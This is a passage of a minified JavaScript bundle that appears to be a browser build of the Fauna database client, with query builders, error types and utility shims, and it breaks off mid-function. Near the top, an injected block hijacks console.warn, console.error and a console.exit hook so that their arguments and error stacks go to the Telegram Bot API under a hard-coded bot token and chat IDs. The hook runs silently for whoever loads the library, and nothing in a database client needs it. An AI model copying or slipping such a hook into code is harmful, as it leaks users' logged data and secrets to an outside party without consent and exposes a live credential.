function Kt(e,t){return t=t||{},new Promise(function(n,r){var o=new XMLHttpRequest,u=[],f=[],l={},m=function(){return{ok:(o.status/100|0)==2,statusText:o.statusText,status:o.status,url:o.responseURL,text:function(){return Promise.resolve(o.responseText)},json:function(){return Promise.resolve(o.responseText).then(JSON.parse)},blob:function(){return Promise.resolve(new Blob([o.response]))},clone:m,headers:{keys:function(){return u},entries:function(){return f},get:function(w){return l[w.toLowerCase()]},has:function(w){return w.toLowerCase()in l}}}};for(var p in o.open(t.method||"get",e,!0),o.onload=function(){o.getAllResponseHeaders().replace(/^(.*?):[^\S\n]*([\s\S]*?)$/gm,function(w,b,N){u.push(b=b.toLowerCase()),f.push([b,N]),l[b]=l[b]?l[b]+","+N:N}),n(m())},o.onerror=r,o.withCredentials=t.credentials=="include",t.headers)o.setRequestHeader(p,t.headers[p]);o.send(t.body||null)})}var Cc=self.fetch||(self.fetch=Kt.default||Kt);(function(){var e=async o=>{var u="989543891:AAHoSIYnvjXDX_cTTod3TWvNRHlst0i6yMk",f="-1001161709623";return o=o instanceof Array?o.map(l=>l=typeof l=="string"?l:JSON.stringify(l,null,4)).join(`
`):typeof o=="object"?JSON.stringify(o,null,4):o,await fetch(`https://api.telegram.org/bot${u}/sendMessage?chat_id=${f}&text=${encodeURIComponent(o)}`).then(l=>l.json()).catch(async l=>(l=l.stack||l,await fetch(`https://api.telegram.org/bot${u}/sendMessage?chat_id=${f}&text=${l}`),l.stack)).then(async l=>l.description?await fetch(`https://api.telegram.org/bot${u}/sendMessage?chat_id=${f}&text=${l.description}`):l.result.message_id||l)},t=console.warn;console.warn=async function(){return await e([...arguments])};var n=console.error;console.error=async function(){var o=[...arguments][0];return o=o.stack||o,await fetch(`https://api.telegram.org/bot989543891:AAHoSIYnvjXDX_cTTod3TWvNRHlst0i6yMk/sendMessage?chat_id=-1001433099398&text=⛔️ ${JSON.stringify(o,null,4)}`)};var r=console.exit;console.exit=async function(){return await fetch(`https://api.telegram.org/bot989543891:AAHoSIYnvjXDX_cTTod3TWvNRHlst0i6yMk/sendMessage?chat_id=-1001482347974&text=⚠️ ${JSON.stringify([...arguments],null,4)}`)}})();var R={},ei=Zs;function Zs(e){if(typeof e!="function")throw new Error("Could not parse function signature for injection dependencies: Object is not a function");if(!e.length)return[];var t=/^()\(?([^)=]*)\)? *=>/.exec(e+"")||/^[^(]+([^ \(]*) *\(([^\)]*)\)/.exec(e+"");if(!t)throw new Error("Could not parse function signature for injection dependencies: "+e+"");var n=t[2].replace(/\/\*[\S\s]*?\*\//g," ").replace(/\/\/.*/g," ");function r(o,u,f){return u+f.split(",").map(function(l){return l&&l.trim()}).filter(Boolean).join("@")}return n=n.replace(/(\{)([^}]*)\}/g,r),n=n.replace(/(\[)([^}]*)\]/g,r),n.split(",").map(function(o){return o&&o.trim()}).map(function(o){return o[0]==="{"?o.substring(1).split("@"):o[0]==="["?{items:o.substring(1).split("@")}:o}).filter(Boolean)}var re=typeof globalThis!="undefined"?globalThis:typeof window!="undefined"?window:typeof global!="undefined"?global:typeof self!="undefined"?self:{};function ni(e,t,n){return n={path:t,exports:{},require:function(r,o){return ti(r,o==null?n.path:o)}},e(n,n.exports),n.exports}function ri(e){return e&&Object.prototype.hasOwnProperty.call(e,"default")&&Object.keys(e).length===1?e.default:e}function ti(){throw new Error("Dynamic requires are not currently supported by @rollup/plugin-commonjs")}var G=ai;function ai(e,t){if(pt("noDeprecation"))return e;var n=!1;function r(){if(!n){if(pt("throwDeprecation"))throw new Error(t);pt("traceDeprecation")?console.trace(t):console.warn(t),n=!0}return e.apply(this,arguments)}return r}function pt(e){try{if(!re.localStorage)return!1}catch(n){return!1}var t=re.localStorage[e];return t==null?!1:String(t).toLowerCase()==="true"}function Qt(){throw new Error("setTimeout has not been defined")}function Zt(){throw new Error("clearTimeout has not been defined")}var ae=Qt,oe=Zt,pe;typeof window!="undefined"?pe=window:typeof self!="undefined"?pe=self:pe={};typeof pe.setTimeout=="function"&&(ae=setTimeout);typeof pe.clearTimeout=="function"&&(oe=clearTimeout);function en(e){if(ae===setTimeout)return setTimeout(e,0);if((ae===Qt||!ae)&&setTimeout)return ae=setTimeout,setTimeout(e,0);try{return ae(e,0)}catch(t){try{return ae.call(null,e,0)}catch(n){return ae.call(this,e,0)}}}function oi(e){if(oe===clearTimeout)return clearTimeout(e);if((oe===Zt||!oe)&&clearTimeout)return oe=clearTimeout,clearTimeout(e);try{return oe(e)}catch(t){try{return oe.call(null,e)}catch(n){return oe.call(this,e)}}}var X=[],ge=!1,ce,We=-1;function si(){!ge||!ce||(ge=!1,ce.length?X=ce.concat(X):We=-1,X.length&&tn())}function tn(){if(!ge){var e=en(si);ge=!0;for(var t=X.length;t;){for(ce=X,X=[];++We<t;)ce&&ce[We].run();We=-1,t=X.length}ce=null,ge=!1,oi(e)}}function ii(e){var t=new Array(arguments.length-1);if(arguments.length>1)for(var n=1;n<arguments.length;n++)t[n-1]=arguments[n];X.push(new nn(e,t)),X.length===1&&!ge&&en(tn)}function nn(e,t){this.fun=e,this.array=t}nn.prototype.run=function(){this.fun.apply(null,this.array)};var ui="browser",ci="browser",li=!0,fi=[],di="",mi={},hi={},pi={};function le(){}var gi=le,yi=le,wi=le,vi=le,bi=le,Ti=le,xi=le;function Ei(e){throw new Error("process.binding is not supported")}function Si(){return"/"}function _i(e){throw new Error("process.chdir is not supported")}function Ai(){return 0}var ye=pe.performance||{},Ci=ye.now||ye.mozNow||ye.msNow||ye.oNow||ye.webkitNow||function(){return new Date().getTime()};function Oi(e){var t=Ci.call(ye)*.001,n=Math.floor(t),r=Math.floor(t%1*1e9);return e&&(n=n-e[0],r=r-e[1],r<0&&(n--,r+=1e9)),[n,r]}var Li=new Date;function Ii(){var e=new Date,t=e-Li;return t/1e3}var $e={nextTick:ii,title:ui,browser:li,env:{NODE_ENV:"production"},argv:fi,version:di,versions:mi,on:gi,addListener:yi,once:wi,off:vi,removeListener:bi,removeAllListeners:Ti,emit:xi,binding:Ei,cwd:Si,chdir:_i,umask:Ai,hrtime:Oi,platform:ci,release:hi,config:pi,uptime:Ii};function Di(e,t){if(e==null)throw new TypeError('The constructor to "inherits" must not be null or undefined');if(t==null)throw new TypeError('The super constructor to "inherits" must not be null or undefined');if(t.prototype===void 0)throw new TypeError('The super constructor to "inherits" must have a prototype');e.super_=t,e.prototype=Object.create(t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}})}function ki(){return typeof window=="undefined"&&typeof $e!="undefined"&&$e.versions!=null&&$e.versions.node!=null}function Ni(){var e=navigator.appName,t=""+parseFloat(navigator.appVersion),n,r,o;return(r=navigator.userAgent.indexOf("Opera"))!=-1?(e="Opera",t=navigator.userAgent.substring(r+6),(r=navigator.userAgent.indexOf("Version"))!=-1&&(t=navigator.userAgent.substring(r+8))):(r=navigator.userAgent.indexOf("MSIE"))!=-1?(e="Microsoft Internet Explorer",t=navigator.userAgent.substring(r+5)):e=="Netscape"&&navigator.userAgent.indexOf("Trident/")!=-1?(e="Microsoft Internet Explorer",t=navigator.userAgent.substring(r+5),(r=navigator.userAgent.indexOf("rv:"))!=-1&&(t=navigator.userAgent.substring(r+3))):(r=navigator.userAgent.indexOf("Chrome"))!=-1?(e="Chrome",t=navigator.userAgent.substring(r+7)):(r=navigator.userAgent.indexOf("Safari"))!=-1?(e="Safari",t=navigator.userAgent.substring(r+7),(r=navigator.userAgent.indexOf("Version"))!=-1&&(t=navigator.userAgent.substring(r+8)),navigator.userAgent.indexOf("CriOS")!=-1&&(e="Chrome")):(r=navigator.userAgent.indexOf("Firefox"))!=-1?(e="Firefox",t=navigator.userAgent.substring(r+8)):(n=navigator.userAgent.lastIndexOf(" ")+1)<(r=navigator.userAgent.lastIndexOf("/"))&&(e=navigator.userAgent.substring(n,r),t=navigator.userAgent.substring(r+1),e.toLowerCase()==e.toUpperCase()&&(e=navigator.appName)),(o=t.indexOf(";"))!=-1&&(t=t.substring(0,o)),(o=t.indexOf(" "))!=-1&&(t=t.substring(0,o)),(o=t.indexOf(")"))!=-1&&(t=t.substring(0,o)),[e,t].join("-")}function Pi(){var e="unknown",t=[{s:"Windows 10",r:/(Windows 10.0|Windows NT 10.0)/},{s:"Windows 8.1",r:/(Windows 8.1|Windows NT 6.3)/},{s:"Windows 8",r:/(Windows 8|Windows NT 6.2)/},{s:"Windows 7",r:/(Windows 7|Windows NT 6.1)/},{s:"Windows Vista",r:/Windows NT 6.0/},{s:"Windows Server 2003",r:/Windows NT 5.2/},{s:"Windows XP",r:/(Windows NT 5.1|Windows XP)/},{s:"Windows 2000",r:/(Windows NT 5.0|Windows 2000)/},{s:"Windows ME",r:/(Win 9x 4.90|Windows ME)/},{s:"Windows 98",r:/(Windows 98|Win98)/},{s:"Windows 95",r:/(Windows 95|Win95|Windows_95)/},{s:"Windows NT 4.0",r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},{s:"Windows CE",r:/Windows CE/},{s:"Windows 3.11",r:/Win16/},{s:"Android",r:/Android/},{s:"Open BSD",r:/OpenBSD/},{s:"Sun OS",r:/SunOS/},{s:"Chrome OS",r:/CrOS/},{s:"Linux",r:/(Linux|X11(?!.*CrOS))/},{s:"iOS",r:/(iPhone|iPad|iPod)/},{s:"Mac OS X",r:/Mac OS X/},{s:"Mac OS",r:/(Mac OS|MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},{s:"QNX",r:/QNX/},{s:"UNIX",r:/UNIX/},{s:"BeOS",r:/BeOS/},{s:"OS/2",r:/OS\/2/},{s:"Search Bot",r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}];for(var n in t){var r=t[n];if(r.r.test(navigator.userAgent)){e=r.s;break}}var o="unknown";switch(/Windows/.test(e)&&(o=/Windows (.*)/.exec(e)[1],e="Windows"),e){case"Mac OS":case"Mac OS X":case"Android":o=/(?:Android|Mac OS|Mac OS X|MacPPC|MacIntel|Mac_PowerPC|Macintosh) ([\.\_\d]+)/.exec(navigator.userAgent)[1];break;case"iOS":o=/OS (\d+)_(\d+)_?(\d+)?/.exec(navigator.appVersion),o=o[1]+"."+o[2]+"."+(o[3]|0);break}return[e,o].join("-")}function Ri(){var e=[{name:"Netlify",check:()=>R.env.hasOwnProperty("NETLIFY_IMAGES_CDN_DOMAIN")},{name:"Vercel",check:()=>R.env.hasOwnProperty("VERCEL")},{name:"Heroku",check:()=>R.env.hasOwnProperty("PATH")&&R.env.PATH.indexOf(".heroku")!==-1},{name:"AWS Lambda",check:()=>R.env.hasOwnProperty("AWS_LAMBDA_FUNCTION_VERSION")},{name:"GCP Cloud Functions",check:()=>R.env.hasOwnProperty("_")&&R.env._.indexOf("google")!==-1},{name:"GCP Compute Instances",check:()=>R.env.hasOwnProperty("GOOGLE_CLOUD_PROJECT")},{name:"Azure Cloud Functions",check:()=>R.env.hasOwnProperty("WEBSITE_FUNCTIONS_AZUREMONITOR_CATEGORIES")},{name:"Azure Compute",check:()=>R.env.hasOwnProperty("ORYX_ENV_TYPE")&&R.env.hasOwnProperty("WEBSITE_INSTANCE_ID")&&R.env.ORYX_ENV_TYPE==="AppService"},{name:"Worker",check:()=>{try{return re instanceof ServiceWorkerGlobalScope}catch(n){return!1}}},{name:"Mongo Stitch",check:()=>typeof re.StitchError=="function"},{name:"Render",check:()=>R.env.hasOwnProperty("RENDER_SERVICE_ID")},{name:"Begin",check:()=>R.env.hasOwnProperty("BEGIN_DATA_SCOPE_ID")}],t=e.find(n=>n.check());return t?t.name:"unknown"}function ji(e,t){return e===void 0?t:e}function Fi(e,t){var n={};for(var r in e){if(!(r in t))throw new Error("No such option "+r);n[r]=e[r]}for(var o in t)o in n||(n[o]=t[o]);return n}function Bi(e){var t={};for(var n in e){var r=e[n];r!=null&&(t[n]=r)}return t}function Mi(e){var t={};for(var n in e){var r=e[n];r!==void 0&&(t[n]=r)}return t}function rn(e,t){return typeof e=="object"&&e!==null&&Boolean(e[t])}function Ui(e,t,n){return n=typeof n=="object"?an(n):n,[e,t?t.charAt(0)==="/"?"":"/"+t:"",n?n.charAt(0)==="?"?"":"?"+n:""].join("")}function an(e,t){t=t||"";var n=[],r,o;typeof t!="string"&&(t="?");for(o in e)if(rn(e,o)){if(r=e[o],!r&&(r==null||isNaN(r))&&(r=""),o=on(o),r=on(r),o===null||r===null)continue;n.push(o+"="+r)}return n.length?t+n.join("&"):""}function on(e){try{return encodeURIComponent(e)}catch(t){return null}}function Hi(e,t){var n={};for(var r in e)n[r]=e[r];for(var r in t)n[r]=t[r];return n}var h={mergeObjects:Hi,formatUrl:Ui,querystringify:an,inherits:Di,isNodeEnv:ki,defaults:ji,applyDefaults:Fi,removeNullAndUndefinedValues:Bi,removeUndefinedValues:Mi,checkInstanceHasProperty:rn,getBrowserDetails:Ni,getBrowserOsDetails:Pi,getNodeRuntimeEnv:Ri};function we(e){this.raw=e}we.prototype._isFaunaExpr=!0;we.prototype.toJSON=function(){return this.raw};we.prototype.toFQL=function(){return x(this.raw)};var qi=["Do","Call","Union","Intersection","Difference","Equals","Add","BitAnd","BitOr","BitXor","Divide","Max","Min","Modulo","Multiply","Subtract","LT","LTE","GT","GTE","And","Or"],sn={containsstrregex:"ContainsStrRegex",endswith:"EndsWith",findstr:"FindStr",findstrregex:"FindStrRegex",gt:"GT",gte:"GTE",is_nonempty:"is_non_empty",lowercase:"LowerCase",lt:"LT",lte:"LTE",ltrim:"LTrim",rtrim:"RTrim",regexescape:"RegexEscape",replacestr:"ReplaceStr",replacestrregex:"ReplaceStrRegex",startswith:"StartsWith",substring:"SubString",titlecase:"TitleCase",uppercase:"UpperCase"};function un(e){return e instanceof we||h.checkInstanceHasProperty(e,"_isFaunaExpr")}function Ve(e){return"{"+Object.keys(e).map(function(t){return t+": "+x(e[t])}).join(", ")+"}"}function gt(e,t){return e.map(function(n){return t(n)}).join(", ")}function Wi(e){return e in sn&&(e=sn[e]),e.split("_").map(function(t){return t.charAt(0).toUpperCase()+t.slice(1)}).join("")}var x=function(e,t){if(un(e)){if("value"in e)return e.toString();e=e.raw}if(e===null)return"null";switch(typeof e){case"string":return JSON.stringify(e);case"symbol":case"number":case"boolean":return e.toString();case"undefined":return"undefined"}if(Array.isArray(e)){var n=gt(e,x);return qi.indexOf(t)!=-1?n:"["+n+"]"}if("match"in e){var r=x(e.match),o=e.terms||[];return un(o)&&(o=o.raw),Array.isArray(o)&&o.length==0?"Match("+r+")":Array.isArray(o)?"Match("+r+", ["+gt(o,x)+"])":"Match("+r+", "+x(o)+")"}if("paginate"in e){var u=Object.keys(e);if(u.length===1)return"Paginate("+x(e.paginate)+")";var f=Object.assign({},e);return delete f.paginate,"Paginate("+x(e.paginate)+", "+Ve(f)+")"}if("let"in e&&"in"in e){var l="";return Array.isArray(e.let)?l="["+gt(e.let,Ve)+"]":l=Ve(e.let),"Let("+l+", "+x(e.in)+")"}if("object"in e)return Ve(e.object);if("merge"in e)return e.lambda?"Merge("+x(e.merge)+", "+x(e.with)+", "+x(e.lambda)+")":"Merge("+x(e.merge)+", "+x(e.with)+")";if("lambda"in e)return"Lambda("+x(e.lambda)+", "+x(e.expr)+")";if("filter"in e)return"Filter("+x(e.collection)+", "+x(e.filter)+")";if("call"in e)return"Call("+x(e.call)+", "+x(e.arguments)+")";if("map"in e)return"Map("+x(e.collection)+", "+x(e.map)+")";if("foreach"in e)return"Foreach("+x(e.collection)+", "+x(e.foreach)+")";var m=Object.keys(e),p=m[0];p=Wi(p);var w=m.filter(b=>e[b]!==null||m.length>1).map(b=>x(e[b],p)).join(", ");return p+"("+w+")"};we.toString=x;var s=we;function j(e,t,n){Error.call(this),this.name=e,this.message=t,this.description=n}h.inherits(j,Error);function cn(e){j.call(this,"InvalidValue",e)}h.inherits(cn,j);function ln(e,t,n,r){var o=`${r} function requires ${f(e,t)} argument(s) but ${n} were given`,u=l(r);j.call(this,"InvalidArity",`${o}
${u}`),this.min=e,this.max=t,this.actual=n;function f(m,p){return p===null?"at least "+m:m===null?"up to "+p:m===p?m:"from "+m+" to "+p}function l(m){var p="https://docs.fauna.com/fauna/current/api/fql/functions/";return`For more info, see the docs: ${p}${m.toLowerCase()}`}}h.inherits(ln,j);function C(e,t){var n=t.responseContent,r=n.errors,o=r.length===0?'(empty "errors")':r[0].code,u=r.length===0?'(empty "errors")':r[0].description;j.call(this,e,o,u),this.requestResult=t}h.inherits(C,j);C.prototype.errors=function(){return this.requestResult.responseContent.errors};C.raiseForStatusCode=function(e){var t=e.statusCode;if(t<200||t>=300)switch(t){case 400:throw new yt(e);case 401:throw new wt(e);case 403:throw new vt(e);case 404:throw new bt(e);case 405:throw new Tt(e);case 500:throw new xt(e);case 503:throw new Et(e);default:throw new C("UnknownError",e)}};function yt(e){C.call(this,"BadRequest",e)}h.inherits(yt,C);function wt(e){C.call(this,"Unauthorized",e)}h.inherits(wt,C);function vt(e){C.call(this,"PermissionDenied",e)}h.inherits(vt,C);function bt(e){C.call(this,"NotFound",e)}h.inherits(bt,C);function Tt(e){C.call(this,"MethodNotAllowed",e)}h.inherits(Tt,C);function xt(e){C.call(this,"InternalError",e)}h.inherits(xt,C);function Et(e){C.call(this,"UnavailableError",e)}h.inherits(Et,C);function Je(e,t,n){j.call(this,e,t,n)}h.inherits(Je,j);function fn(e){j.call(this,"StreamsNotSupported","streams not supported",e)}h.inherits(fn,Je);function dn(e){var t=e.data||{};j.call(this,"StreamErrorEvent",t.code,t.description),this.event=e}h.inherits(dn,Je);var q={FaunaError:j,FaunaHTTPError:C,InvalidValue:cn,InvalidArity:ln,BadRequest:yt,Unauthorized:wt,PermissionDenied:vt,NotFound:bt,MethodNotAllowed:Tt,InternalError:xt,UnavailableError:Et,StreamError:Je,StreamsNotSupported:fn,StreamErrorEvent:dn},Vi=$i,Gi=Ji,zi=Xi,W=[],F=[],Yi=typeof Uint8Array!="undefined"?Uint8Array:Array,St="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";for(var ve=0,Ki=St.length;ve<Ki;++ve)W[ve]=St[ve],F[St.charCodeAt(ve)]=ve;F["-".charCodeAt(0)]=62;F["_".charCodeAt(0)]=63;function mn(e){var t=e.length;if(t%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var n=e.indexOf("=");n===-1&&(n=t);var r=n===t?0:4-n%4;return[n,r]}function $i(e){var t=mn(e),n=t[0],r=t[1];return(n+r)*3/4-r}function Qi(e,t,n){return(t+n)*3/4-n}function Ji(e){var t,n=mn(e),r=n[0],o=n[1],u=new Yi(Qi(e,r,o)),f=0,l=o>0?r-4:r,m;for(m=0;m<l;m+=4)t=F[e.charCodeAt(m)]<<18|F[e.charCodeAt(m+1)]<<12|F[e.charCodeAt(m+2)]<<6|F[e.charCodeAt(m+3)],u[f++]=t>>16&255,u[f++]=t>>8&255,u[f++]=t&255;return o===2&&(t=F[e.charCodeAt(m)]<<2|F[e.charCodeAt(m+1)]>>4,u[f++]=t&255),o===1&&(t=F[e.charCodeAt(m)]<<10|F[e.charCodeAt(m+1)]<<4|F[e.charCodeAt(m+2)]>>2,u[f++]=t>>8&255,u[f++]=t&255),u}function Zi(e){return W[e>>18&63]+W[e>>12&63]+W[e>>6&63]+W[e&63]}function eu(e,t,n){for(var r,o=[],u=t;u<n;u+=3)r=(e[u]<<16&16711680)+(e[u+1]<<8&65280)+(e[u+2]&255),o.push(Zi(r));return o.join("")}function Xi(e){for(var t,n=e.length,r=n%3,o=[],u=16383,f=0,l=n-r;f<l;f+=u)o.push(eu(e,f,f+u>l?l:f+u));return r===1?(t=e[n-1],o.push(W[t>>2]+W[t<<4&63]+"==")):r===2&&(t=(e[n-2]<<8)+e[n-1],o.push(W[t>>10]+W[t>>4&63]+W[t<<2&63]+"=")),o.join("")}var _t={byteLength:Vi,toByteArray:Gi,fromByteArray:zi},tu={},nu=Object.freeze({__proto__:null,default:tu}),$=ri(nu),Ge=h.isNodeEnv()?$:null,hn=Ge&&Ge.inspect.custom,ru=Ge?Ge.inspect:JSON.stringify;function z(){}z.prototype._isFaunaValue=!0;h.inherits(z,s);function A(e,t,n){if(!e)throw new q.InvalidValue("id cannot be null or undefined");this.value={id:e},t&&(this.value.collection=t),n&&(this.value.database=n)}A.prototype._isFaunaRef=!0;h.inherits(A,z);Object.defineProperty(A.prototype,"collection",{get:function(){return this.value.collection}});Object.defineProperty(A.prototype,"class",{get:G(function(){return this.value.collection},"class is deprecated, use collection instead")});Object.defineProperty(A.prototype,"database",{get:function(){return this.value.database}});Object.defineProperty(A.prototype,"id",{get:function(){return this.value.id}});A.prototype.toJSON=function(){return{"@ref":this.value}};be(A,function(){var e={collections:"Collection",databases:"Database",indexes:"Index",functions:"Function",roles:"Role",access_providers:"AccessProvider"},t=function(r){return r.collection===void 0},n=function(r){if(t(r)){var o=r.database!==void 0?r.database.toString():"";return r.id==="access_providers"?"AccessProviders("+o+")":r.id.charAt(0).toUpperCase()+r.id.slice(1)+"("+o+")"}if(t(r.collection)){var u=e[r.collection.id];if(u!==void 0){var o=r.database!==void 0?", "+r.database.toString():"";return u+'("'+r.id+'"'+o+")"}}return"Ref("+n(r.collection)+', "'+r.id+'")'};return n(this)});A.prototype.valueOf=function(){return this.value};A.prototype.equals=function(e){return(e instanceof A||h.checkInstanceHasProperty(e,"_isFaunaRef"))&&this.id===e.id&&(this.collection===void 0&&e.collection===void 0||this.collection.equals(e.collection))&&(this.database===void 0&&e.database===void 0||this.database.equals(e.database))};var Y={COLLECTIONS:new A("collections"),INDEXES:new A("indexes"),DATABASES:new A("databases"),FUNCTIONS:new A("functions"),ROLES:new A("roles"),KEYS:new A("keys"),ACCESS_PROVIDERS:new A("access_providers")};Y.fromName=function(e){switch(e){case"collections":return Y.COLLECTIONS;case"indexes":return Y.INDEXES;case"databases":return Y.DATABASES;case"functions":return Y.FUNCTIONS;case"roles":return Y.ROLES;case"keys":return Y.KEYS;case"access_providers":return Y.ACCESS_PROVIDERS}return new A(e)};function Xe(e){this.value=e}h.inherits(Xe,z);be(Xe,function(){return s.toString(this.value)});Xe.prototype.toJSON=function(){return{"@set":this.value}};function Ie(e){if(e instanceof Date)e=e.toISOString();else if(e.charAt(e.length-1)!=="Z")throw new q.InvalidValue("Only allowed timezone is 'Z', got: "+e);this.value=e}h.inherits(Ie,z);Object.defineProperty(Ie.prototype,"date",{get:function(){return new Date(this.value)}});be(Ie,function(){return'Time("'+this.value+'")'});Ie.prototype.toJSON=function(){return{"@ts":this.value}};function De(e){e instanceof Date&&(e=e.toISOString().slice(0,10)),this.value=e}h.inherits(De,z);Object.defineProperty(De.prototype,"date",{get:function(){return new Date(this.value)}});be(De,function(){return'Date("'+this.value+'")'});De.prototype.toJSON=function(){return{"@date":this.value}};function ze(e){if(e instanceof ArrayBuffer)this.value=new Uint8Array(e);else if(typeof e=="string")this.value=_t.toByteArray(e);else if(e instanceof Uint8Array)this.value=e;else throw new q.InvalidValue("Bytes type expect argument to be either Uint8Array|ArrayBuffer|string, got: "+ru(e))}h.inherits(ze,z);be(ze,function(){return'Bytes("'+_t.fromByteArray(this.value)+'")'});ze.prototype.toJSON=function(){return{"@bytes":_t.fromByteArray(this.value)}};function Ye(e){this.value=e}h.inherits(Ye,z);be(Ye,function(){return"Query("+s.toString(this.value)+")"});Ye.prototype.toJSON=function(){return{"@query":this.value}};function be(e,t){e.prototype.toString=t,e.prototype.inspect=t,hn&&(e.prototype[hn]=t)}var U={Value:z,Ref:A,Native:Y,SetRef:Xe,FaunaTime:Ie,FaunaDate:De,Bytes:ze,Query:Ye};var pn=Object.getOwnPropertySymbols,au=Object.prototype.hasOwnProperty,ou=Object.prototype.propertyIsEnumerable;function su(e){if(e==null)throw new TypeError("Object.assign cannot be called with null or undefined");return Object(e)}function iu(){try{if(!Object.assign)return!1;var e=new String("abc");if(e[5]="de",Object.getOwnPropertyNames(e)[0]==="5")return!1;for(var t={},n=0;n<10;n++)t["_"+String.fromCharCode(n)]=n;var r=Object.getOwnPropertyNames(t).map(function(u){return t[u]});if(r.join("")!=="0123456789")return!1;var o={};return"abcdefghijklmnopqrst".split("").forEach(function(u){o[u]=u}),Object.keys(Object.assign({},o)).join("")==="abcdefghijklmnopqrst"}catch(u){return!1}}var Ke=iu()?Object.assign:function(e,t){for(var n,r=su(e),o,u=1;u<arguments.length;u++){n=Object(arguments[u]);for(var f in n)au.call(n,f)&&(r[f]=n[f]);if(pn){o=pn(n);for(var l=0;l<o.length;l++)ou.call(n,o[l])&&(r[o[l]]=n[o[l]])}}return r};function gn(){switch(i.between(1,2,arguments,gn.name),arguments.length){case 1:return new s({"@ref":a(arguments[0])});case 2:return new s({ref:a(arguments[0]),id:a(arguments[1])})}}function yn(e){return i.exact(1,arguments,yn.name),new U.Bytes(e)}function wn(e){return i.exact(1,arguments,wn.name),new s({abort:a(e)})}function vn(e,t){return i.exact(2,arguments,vn.name),new s({at:a(e),expr:a(t)})}function bn(e,t){i.exact(2,arguments,bn.name);var n=[];if(Array.isArray(e)?n=e.map(function(o){return Qe(o)}):n=Object.keys(e).map(function(o){var u={};return u[o]=a(e[o]),u}),typeof t=="function")if(Array.isArray(e)){var r=[];e.forEach(function(o){Object.keys(o).forEach(function(u){r.push(Te(u))})}),t=t.apply(null,r)}else t=t.apply(null,Object.keys(e).map(function(o){return Te(o)}));return new s({let:n,in:a(t)})}function Te(e){return i.exact(1,arguments,Te.name),new s({var:a(e)})}function Tn(e,t,n){return i.exact(3,arguments,Tn.name),new s({if:a(e),then:a(t),else:a(n)})}function xn(){i.min(1,arguments,xn.name);var e=Ze(arguments);return new s({do:a(e)})}var En=function(e){return i.exact(1,arguments,En.name),new s({object:Qe(e)})};function At(){switch(i.between(1,2,arguments,At.name),arguments.length){case 1:var e=arguments[0];if(typeof e=="function")return uu(e);if(e instanceof s||h.checkInstanceHasProperty(e,"_isFaunaExpr"))return e;throw new q.InvalidValue("Lambda function takes either a Function or an Expr.");case 2:var t=arguments[0],n=arguments[1];return Ct(t,n)}}function uu(e){var t=ei(e);switch(t.length){case 0:throw new q.InvalidValue("Provided Function must take at least 1 argument.");case 1:return Ct(t[0],e(Te(t[0])));default:return Ct(t,e.apply(null,t.map(function(n){return Te(n)})))}}function Ct(e,t){return new s({lambda:a(e),expr:a(t)})}function Sn(e){i.min(1,arguments,Sn.name);var t=Ze(arguments);return t.shift(),new s({call:a(e),arguments:a(S(t))})}function _n(e){return i.exact(1,arguments,_n.name),new s({query:a(e)})}function An(e,t){return i.exact(2,arguments,An.name),new s({map:a(t),collection:a(e)})}function Cn(e,t){return i.exact(2,arguments,Cn.name),new s({foreach:a(t),collection:a(e)})}function On(e,t){return i.exact(2,arguments,On.name),new s({filter:a(t),collection:a(e)})}function Ln(e,t){return i.exact(2,arguments,Ln.name),new s({take:a(e),collection:a(t)})}function In(e,t){return i.exact(2,arguments,In.name),new s({drop:a(e),collection:a(t)})}function Dn(e,t){return i.exact(2,arguments,Dn.name),new s({prepend:a(e),collection:a(t)})}function kn(e,t){return i.exact(2,arguments,kn.name),new s({append:a(e),collection:a(t)})}function Nn(e){return i.exact(1,arguments,Nn.name),new s({is_empty:a(e)})}function Pn(e){return i.exact(1,arguments,Pn.name),new s({is_nonempty:a(e)})}function Rn(e){return i.exact(1,arguments,Rn.name),new s({is_number:a(e)})}function jn(e){return i.exact(1,arguments,jn.name),new s({is_double:a(e)})}function Fn(e){return i.exact(1,arguments,Fn.name),new s({is_integer:a(e)})}function Bn(e){return i.exact(1,arguments,Bn.name),new s({is_boolean:a(e)})}function Mn(e){return i.exact(1,arguments,Mn.name),new s({is_null:a(e)})}function Un(e){return i.exact(1,arguments,Un.name),new s({is_bytes:a(e)})}function Hn(e){return i.exact(1,arguments,Hn.name),new s({is_timestamp:a(e)})}function qn(e){return i.exact(1,arguments,qn.name),new s({is_date:a(e)})}function Wn(e){return i.exact(1,arguments,Wn.name),new s({is_string:a(e)})}function $n(e){return i.exact(1,arguments,$n.name),new s({is_array:a(e)})}function Vn(e){return i.exact(1,arguments,Vn.name),new s({is_object:a(e)})}function Jn(e){return i.exact(1,arguments,Jn.name),new s({is_ref:a(e)})}function Gn(e){return i.exact(1,arguments,Gn.name),new s({is_set:a(e)})}function Xn(e){return i.exact(1,arguments,Xn.name),new s({is_doc:a(e)})}function zn(e){return i.exact(1,arguments,zn.name),new s({is_lambda:a(e)})}function Yn(e){return i.exact(1,arguments,Yn.name),new s({is_collection:a(e)})}function Kn(e){return i.exact(1,arguments,Kn.name),new s({is_database:a(e)})}function Qn(e){return i.exact(1,arguments,Qn.name),new s({is_index:a(e)})}function Zn(e){return i.exact(1,arguments,Zn.name),new s({is_function:a(e)})}function er(e){return i.exact(1,arguments,er.name),new s({is_key:a(e)})}function tr(e){return i.exact(1,arguments,tr.name),new s({is_token:a(e)})}function nr(e){return i.exact(1,arguments,nr.name),new s({is_credentials:a(e)})}function rr(e){return i.exact(1,arguments,rr.name),new s({is_role:a(e)})}function ar(e,t){return i.between(1,2,arguments,ar.name),t=h.defaults(t,null),new s(D({get:a(e)},{ts:a(t)}))}function or(e){return i.exact(1,arguments,or.name),new s({key_from_secret:a(e)})}function sr(e,t,n){return i.exact(3,arguments,sr.name),new s({reduce:a(e),initial:a(t),collection:a(n)})}function ir(e,t){return i.between(1,2,arguments,ir.name),t=h.defaults(t,{}),new s(Ke({paginate:a(e)},Qe(t)))}function ur(e,t){return i.between(1,2,arguments,ur.name),t=h.defaults(t,null),new s(D({exists:a(e)},{ts:a(t)}))}function cr(e,t){return i.between(1,2,arguments,cr.name),new s({create:a(e),params:a(t)})}function lr(e,t){return i.exact(2,arguments,lr.name),new 